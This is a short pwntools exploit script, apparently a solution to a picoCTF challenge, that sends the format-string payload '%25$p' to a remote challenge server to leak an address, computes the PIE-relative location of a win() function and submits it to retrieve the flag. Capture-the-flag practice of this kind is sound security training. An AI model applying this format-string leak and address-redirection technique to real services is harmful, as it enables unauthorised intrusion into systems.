from pwn import *

# load the on‑disk binary
elf = ELF("./vuln2")

# start process (or remote)
# p = process("./vuln")
p = remote("rescued-float.picoctf.net", "56109")

p.recvuntil(b"name:")  
p.sendline(b"%25$p")  
main_addr = int(p.recvline().strip(), 16) 
# compute base address of the PIE (or non‑PIE) image
base = main_addr  

# compute the real address of win()
win_addr = base + elf.symbols['win'] - elf.symbols['main']

# send it back, in hex
# p.sendline(hex(win_addr))
hex_str = hex(win_addr)              # str, e.g. "0x7ffff7a05aa0"
p.sendline(hex_str.encode('ascii'))  # bytes, e.g. b"0x7ffff7a05aa0"

# now you should hit the win() logic
p.recvuntil(b"You won!\n")
flag = p.recvline().strip().decode()
print(flag)

p.close()
